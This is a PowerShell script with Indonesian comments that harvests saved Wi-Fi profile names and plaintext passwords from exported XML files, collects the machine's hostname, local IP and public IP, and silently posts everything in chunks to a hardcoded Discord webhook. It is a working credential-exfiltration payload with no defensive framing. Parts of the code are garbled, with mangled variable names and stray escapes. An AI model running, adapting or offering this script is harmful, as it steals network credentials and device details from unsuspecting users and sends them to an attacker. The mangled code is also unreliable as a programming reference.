# 1. Mengambil data profil Wi-Fi yang tersimpan
d = Get-ChildItem (Join-Path env:temp 'Wi*.xml') | ForEach-Object { 
    [xml]x = Get-Content _.FullName
    [PSCustomObject]@{ 
        SSID = \$x.WLANProfile.name
        Pass = \$x.WLANProfile.MSM.Security.sharedKey.keyMaterial 
    } 
}

# 2. Mengambil informasi Hostname dan IP perangkat
\(hostname = [System.Net.Dns]::GetHostName()\)localIP  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \(_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ', '\)publicIP = (Invoke-WebRequest -Uri "https://ipify.org" -UseBasicParsing).Content

# 3. Menyusun informasi dasar sistem
\$systemInfo = @"
**System Info:**
Hostname: \$hostname
Local IP: \$localIP
Public IP: \$publicIP

**Wi-Fi Profiles:**
"@

# Fungsi internal untuk mengirim payload ke Discord secara aman
function Send-DiscordWebhook (\$text) {
    \(payload = @{ content =\)text } | ConvertTo-Json -Depth 2
    try {
        Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1552958439356104746/caHQV2SWyyaBZWNkRZKGbBK5-n1MPG9ftzToJBHwg0P-K7ueK7FUIbw79dl-PrSdmrda' -Method Post -Body \$payload -ContentType 'application/json' -UseBasicParsing | Out-Null
    } catch {
        # Mengabaikan error koneksi sementara saat chunking
    }
}

# 4. Memproses dan mengirim data jika informasi Wi-Fi ditemukan
if (\$d) {
    # Kirim Header info sistem terlebih dahulu
    Send-DiscordWebhook \$systemInfo
    Start-Sleep -Milliseconds 600

    # Ubah objek Wi-Fi menjadi baris teks string
    wifiLines = (d | Out-String) -split "`r`n"
    \$currentChunk = ""

    # Memotong dan membatasi teks secara ketat maksimal 1500 karakter per pesan
    foreach (line in wifiLines) {
        if ((currentChunk.Length + line.Length + 2) -gt 1500) {
            if (\$currentChunk.Trim() -ne "") {
                Send-DiscordWebhook \$currentChunk
                Start-Sleep -Milliseconds 600 # Menghindari rate limit Discord
            }
            currentChunk = line
        } else {
            if (\$currentChunk -eq "") { currentChunk = line }
            else { \$currentChunk += "`r`n" + \$line }
        }
    }

    # Mengirimkan sisa baris terakhir
    if (\$currentChunk.Trim() -ne "") {
        Send-DiscordWebhook \$currentChunk
    }
}
